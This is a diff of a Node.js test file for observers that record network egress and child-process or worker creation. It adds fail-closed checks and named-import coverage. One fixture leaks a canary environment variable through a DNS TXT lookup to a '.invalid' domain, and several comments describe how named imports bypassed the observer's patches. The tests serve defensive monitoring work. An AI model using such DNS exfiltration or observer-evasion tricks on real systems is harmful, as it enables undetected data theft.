@@ -150,9 +150,13 @@ test("a descendant execution context is recorded, and it is an isolation violati
     const log = join(dir, "resolve.ndjson");
     writeFileSync(
       script,
-      'import cp from "node:child_process";\ncp.spawnSync("/usr/bin/true", []);\n' +
-        'import wt from "node:worker_threads";\n' +
-        'const w = new wt.Worker("", { eval: true });\nawait new Promise((r) => w.on("exit", r));\n',
+      // NAMED imports on purpose. Patching a property on the builtin's module object does not
+      // touch the named exports Node already snapshotted, so this is precisely the shape that
+      // created an unrecorded descendant while the resolution log still looked clean; only
+      // syncBuiltinESMExports() in the instrument makes it observable (review round 2, chunk 6).
+      'import { spawnSync } from "node:child_process";\nspawnSync("/usr/bin/true", []);\n' +
+        'import { Worker } from "node:worker_threads";\n' +
+        'const w = new Worker("", { eval: true });\nawait new Promise((r) => w.on("exit", r));\n',
     );
     const child = spawn(process.execPath, ["--import", join(HERE, "instrument.mjs"), script], {
       env: { SPENDBAR_RESOLVE_LOG: log, PATH: process.env.PATH },
@@ -460,10 +464,115 @@ function awaitClose(child, timeoutMs) {
   });
 }
 
-const netAttempts = (logPath) =>
-  existsSync(logPath)
+/**
+ * Egress attempts recorded by net-observe, WITHOUT its startup sentinel — and refusing a log
+ * that has no sentinel at all.
+ *
+ * The observer writes one sentinel line before it patches anything (review round 2, chunk 6).
+ * Its absence used to be indistinguishable from "nothing tried to reach the network": an
+ * observer that never started, or could not write, produced exactly the empty log that a clean
+ * run produces. Reading the log through this function is what makes the difference visible.
+ */
+const NET_SENTINEL = "net-observe/1 started";
+const netAttempts = (logPath) => {
+  const lines = existsSync(logPath)
     ? readFileSync(logPath, "utf8").split("\n").filter((l) => l.trim() !== "")
     : [];
+  const sentinels = lines.filter((l) => l.includes(NET_SENTINEL));
+  assert.equal(sentinels.length, 1, `net-observe did not record its startup sentinel in ${logPath}`);
+  return lines.filter((l) => !l.includes(NET_SENTINEL));
+};
+
+
+
+test("a missing descendant sidecar is unobserved, not 'no descendants'", async () => {
+  // Absence used to mean all three of "none were created", "the instrument never ran" and "the
+  // sidecar could not be written", and the reader resolved it in favour of clean. The instrument
+  // creates it EMPTY before anything can spawn, so absence now means the observation is broken.
+  assert.throws(() => descendantsFor(join(tmpdir(), "no-such-resolve-log.ndjson")), /did not run/);
+
+  await withTempDir(async (dir) => {
+    // A run under the instrument that spawns NOTHING must still leave the witness behind, or
+    // every honest run would be indistinguishable from an unobserved one.
+    const script = join(dir, "quiet.mjs");
+    const log = join(dir, "resolve.ndjson");
+    writeFileSync(script, 'import { join } from "node:path";\njoin("a", "b");\n');
+    const child = spawn(process.execPath, ["--import", join(HERE, "instrument.mjs"), script], {
+      env: { SPENDBAR_RESOLVE_LOG: log, PATH: process.env.PATH },
+      stdio: ["ignore", "ignore", "pipe"],
+    });
+    let stderr = "";
+    child.stderr.on("data", (d) => (stderr += d));
+    const closed = await awaitClose(child, 15_000);
+    assert.equal(closed.code, 0, `quiet fixture failed (${closed.code}): ${stderr}`);
+    assert.deepEqual(descendantsFor(log), [], "a run that spawned nothing did not leave an empty witness");
+  });
+});
+
+test("the observers do not change the constructor semantics of what they observe", async () => {
+  // Replacing Worker with a plain function made it callable without `new`, made a subclass
+  // construct an OriginalWorker instead of the subclass, and dropped static properties. An
+  // observer that alters the thing it observes has invalidated the run it reports on.
+  await withTempDir(async (dir) => {
+    const script = join(dir, "worker-semantics.mjs");
+    writeFileSync(
+      script,
+      'import { Worker } from "node:worker_threads";\n' +
+        'class MyWorker extends Worker {}\n' +
+        'const w = new MyWorker("", { eval: true });\n' +
+        'if (!(w instanceof MyWorker)) { console.error("subclass lost"); process.exit(3); }\n' +
+        'if (!(w instanceof Worker)) { console.error("instanceof lost"); process.exit(4); }\n' +
+        'let threw = false;\n' +
+        'try { Worker("", { eval: true }); } catch { threw = true; }\n' +
+        'if (!threw) { console.error("callable without new"); process.exit(5); }\n' +
+        'await new Promise((r) => w.on("exit", r));\n',
+    );
+    const netLog = join(dir, "net-semantics.ndjson");
+    const child = spawn(process.execPath, ["--import", NET_OBSERVE, script], {
+      env: { SPENDBAR_TEST_CANARY: CANARY, SPENDBAR_NET_LOG: netLog, PATH: process.env.PATH },
+      stdio: ["ignore", "ignore", "pipe"],
+    });
+    let stderr = "";
+    child.stderr.on("data", (d) => (stderr += d));
+    const closed = await awaitClose(child, 15_000);
+    assert.equal(closed.code, 0, `worker semantics changed under observation (${closed.code}): ${stderr}`);
+    // And it was still observed while behaving correctly.
+    assert.match(netAttempts(netLog).join("\n"), /"worker_threads\.Worker"/);
+  });
+});
+
+test("an unwritable egress log stops the call rather than letting it through unrecorded", async () => {
+  // `record` swallowed every append failure and then ran the network call anyway, so a full or
+  // unwritable log filesystem produced real egress and an empty log — which reads as clean. A
+  // positive control that succeeded earlier cannot prove THIS record was written.
+  await withTempDir(async (dir) => {
+    const script = join(dir, "unwritable.mjs");
+    // The log is writable at preload — the sentinel lands — and becomes unwritable before the
+    // egress attempt. That isolates the PER-RECORD append failure, which is the mid-run
+    // disk-full case; a log unwritable from the start is already caught by the sentinel write.
+    writeFileSync(
+      script,
+      'import { chmodSync } from "node:fs";\n' +
+        'import net from "node:net";\n' +
+        'chmodSync(process.env.SPENDBAR_NET_LOG, 0o444);\n' +
+        'let threw = false;\n' +
+        'try { new net.Socket().connect(9, "127.0.0.1"); } catch { threw = true; }\n' +
+        'process.exit(threw ? 0 : 7);\n',
+    );
+    const netLog = join(dir, "unwritable-log.ndjson");
+    const child = spawn(process.execPath, ["--import", NET_OBSERVE, script], {
+      env: { SPENDBAR_TEST_CANARY: CANARY, SPENDBAR_NET_LOG: netLog, PATH: process.env.PATH },
+      stdio: ["ignore", "ignore", "pipe"],
+    });
+    let stderr = "";
+    child.stderr.on("data", (d) => (stderr += d));
+    const closed = await awaitClose(child, 15_000);
+    // Either the connect threw inside the observer (exit 0 from the script's own check) or the
+    // preload itself refused to start. Both are fail-closed; what must NOT happen is exit 7,
+    // which means the socket connected with nothing recorded.
+    assert.notEqual(closed.code, 7, `egress proceeded with an unwritable log: ${stderr}`);
+  });
+});
 
 test("a full probe exchange makes no Node-API egress attempt and moves no canary into any stream", async () => {
   const mock = await startMock();
@@ -583,14 +692,44 @@ test("positive control: DNS-only and descendant egress paths are recorded too", 
         expect: /"child_process\.spawnSync"/,
       },
       {
-        // Namespace access, which is what the property patch covers. A named-import `Worker`
-        // holds the original constructor and has no funnel to patch — net-observe.mjs records
-        // that gap, and Node's permission model is the only thing that closes it.
-        name: "worker_threads",
+        name: "worker_threads-namespace",
         source:
           'import wt from "node:worker_threads";\n' +
           'const w = new wt.Worker("", { eval: true });\nawait new Promise((r) => w.on("exit", r));\n',
         expect: /"worker_threads\.Worker"/,
+      },
+      // The four paths below were documented as UNOBSERVABLE from inside the process, needing
+      // Node's permission model to close. That was wrong (review round 2, chunk 6): patching a
+      // property on a builtin's module object does not touch the named exports Node already
+      // snapshotted, and `syncBuiltinESMExports()` pushes them through. Shown directly — with
+      // the property patched and nothing else, a named import records NOTHING; with the sync
+      // call, it records. Each of these is a path the observer previously stayed silent on.
+      {
+        name: "child_process-named-spawnSync",
+        source: 'import { spawnSync } from "node:child_process";\nspawnSync("/usr/bin/true", []);\n',
+        expect: /"child_process\.spawnSync"/,
+      },
+      {
+        name: "child_process-named-execFileSync",
+        source: 'import { execFileSync } from "node:child_process";\nexecFileSync("/usr/bin/true", []);\n',
+        expect: /"child_process\.execFileSync"/,
+      },
+      {
+        name: "worker_threads-named-import",
+        source:
+          'import { Worker } from "node:worker_threads";\n' +
+          'const w = new Worker("", { eval: true });\nawait new Promise((r) => w.on("exit", r));\n',
+        expect: /"worker_threads\.Worker"/,
+      },
+      {
+        // The DNS case that motivated recording the whole resolver surface in round 1 — reached
+        // through the import style that walked past every patch until now. It needs no socket
+        // through any patched method, so an unobserved resolveTxt is a clean-looking exfiltration.
+        name: "dns-named-resolveTxt",
+        source:
+          'import { resolveTxt } from "node:dns";\n' +
+          'await new Promise((r) => resolveTxt(`${process.env.SPENDBAR_TEST_CANARY}.invalid`, () => r()));\n',
+        expect: /"dns\.resolveTxt"/,
       },
     ];
 
